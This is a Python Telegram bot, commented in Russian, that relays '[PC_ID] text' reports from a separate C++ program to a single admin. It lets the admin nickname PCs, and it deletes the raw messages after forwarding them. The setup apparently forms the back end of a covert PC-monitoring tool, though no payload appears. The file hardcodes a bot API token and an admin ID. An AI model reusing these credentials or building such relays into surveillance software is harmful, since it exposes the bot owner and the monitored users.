import asyncio
import json
import os
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.utils.keyboard import InlineKeyboardBuilder

# --- НАСТРОЙКИ ---
API_TOKEN = '8706100595:AAGyn5FfVysIOE7dQueOF_tBSPMm4Bb5ZVU'
ADMIN_ID = 5261385589 

bot = Bot(token=API_TOKEN)
dp = Dispatcher()
DB_FILE = "names_db.json"

def load_db():
    if os.path.exists(DB_FILE):
        try:
            with open(DB_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
        except: return {}
    return {}

def save_db(data):
    with open(DB_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False, indent=4)

user_names = load_db()

@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    await message.answer(f"✅ Бот-мониторинг активен.\nТвой ID: `{message.from_user.id}`")

# ОСНОВНАЯ ЛОГИКА: Обработка сигналов от C++
@dp.message(lambda message: message.text and message.text.startswith("["))
async def handle_cpp_message(message: types.Message):
    if "]" not in message.text: return

    # Разбираем сообщение [ID] Текст
    parts = message.text.split("]", 1)
    pc_id = parts[0][1:].strip()
    content = parts[1].strip()
    
    # Ищем имя (например, PIOO)
    display_name = user_names.get(pc_id, pc_id)
    
    builder = InlineKeyboardBuilder()
    builder.row(types.InlineKeyboardButton(text="📝 Изменить имя", callback_data=f"rn:{pc_id}"))
    builder.row(types.InlineKeyboardButton(text="🗑 Удалить", callback_data=f"dl:{pc_id}"))

    # Отправляем красивое сообщение
    await bot.send_message(
        ADMIN_ID,
        f"👤 **Пользователь:** `{display_name}`\n"
        f"🆔 ID: `{pc_id}`\n"
        f"---------------------------\n"
        f"{content}",
        parse_mode="Markdown",
        reply_markup=builder.as_markup()
    )
    
    # Удаляем сырое сообщение от C++, чтобы не дублировать информацию
    try:
        await message.delete()
    except:
        pass

@dp.callback_query(F.data.startswith("rn:"))
async def ask_rename(callback: types.CallbackQuery):
    pc_id = callback.data.split(":")[1]
    await callback.message.answer(f"Чтобы изменить имя для `{pc_id}`, введи:\n`/set {pc_id} Имя`", parse_mode="Markdown")
    await callback.answer()

@dp.callback_query(F.data.startswith("dl:"))
async def delete_user(callback: types.CallbackQuery):
    pc_id = callback.data.split(":")[1]
    if pc_id in user_names:
        del user_names[pc_id]
        save_db(user_names)
        await callback.message.answer(f"🗑 Имя для `{pc_id}` удалено.")
    await callback.answer()

@dp.message(Command("set"))
async def set_name(message: types.Message):
    args = message.text.split(maxsplit=2)
    if len(args) < 3:
        return await message.answer("Ошибка! Нужно: `/set ID Имя`")
    pc_id, new_name = args[1], args[2]
    user_names[pc_id] = new_name
    save_db(user_names)
    await message.answer(f"✅ Готово! `{pc_id}` теперь автоматически заменяется на **{new_name}**")

async def main():
    print("[*] Бот запущен! Жду сигналов от C++...")
    await bot.delete_webhook(drop_pending_updates=True)
    await dp.start_polling(bot)

if __name__ == '__main__':
    asyncio.run(main())